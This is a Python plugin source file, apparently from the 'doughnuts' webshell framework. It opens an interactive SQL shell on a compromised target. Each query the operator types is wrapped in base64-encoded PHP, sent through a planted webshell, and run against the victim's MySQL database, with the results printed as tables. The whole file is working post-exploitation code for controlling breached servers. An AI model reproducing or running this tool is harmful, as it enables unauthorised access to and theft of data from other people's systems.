from libs.config import gget, gset, alias, color, set_namespace
from prettytable import PrettyTable
from libs.myapp import send, base64_encode
from webshell_plugins.db_init import get_connect_code
from libs.app import getline


NEW_SQL_WORDLIST = {"common_wordlist": [
    "use",
    "select",
    "from",
    "binary",
    "where",
    "update",
    "insert",
    "delete",
    "show",
    "databases",
    "tables",
    "create",
    "drop",
    "grant",
    "load_file",
    "desc",
    "alter",
    "set",
    "prepare",
    "execute",
]}


def get_php(command, database):
    return """%s
$r=$con->query(base64_decode('%s'));
$rows=$r->fetch_all(MYSQLI_ASSOC);
foreach($rows[0] as $k=>$v){
    echo "$k*,";
}
echo "\\n";
foreach($rows as $array){foreach($array as $k=>$v){echo "$v*,";};echo "\\n";}""" % (get_connect_code(dbname=database), base64_encode(command))


def execute_sql_command(command, database):
    res = send(get_php(command, database))
    if (not res):
        return ''
    rows = res.r_text.strip().split("\n")
    if (len(rows) > 1):
        info = rows[0].split("*,")[:-1]
        form = PrettyTable(info)
        for row in rows[1:]:
            form.add_row(row.split("*,")[:-1])
        return form
    return ''


@alias()
def run():
    """
    db_shell

    Get a temporary sql shell of target system.
    """
    if (not gget("db_connected", "webshell")):
        print(color.red("Please run db_init command first"))
        return
    print(color.cyan(
        "Eenter interactive temporary sql shell...\n\nUse 'back' command to return doughnuts.\n"))
    database = gget("db_dbname", "webshell")
    prompt = "mysql (%s) > "
    set_namespace("webshell", False, True)
    wordlist = gget("webshell.wordlist")
    gset("webshell.wordlist", NEW_SQL_WORDLIST, True)
    try:
        while gget("loop"):
            print(prompt % color.cyan(database), end="")
            command = getline()
            lower_command = command.lower()
            if (lower_command.lower() in ['exit', 'quit', 'back']):
                print()
                break
            if (command == ''):
                print()
                continue
            if (lower_command.startswith("use ") and len(lower_command) > 4):
                database = lower_command.strip(";")[4:]
            else:
                print(execute_sql_command(command, database))
    finally:
        gset("db_dbname", database, True, "webshell")
        gset("webshell.wordlist", wordlist, True)
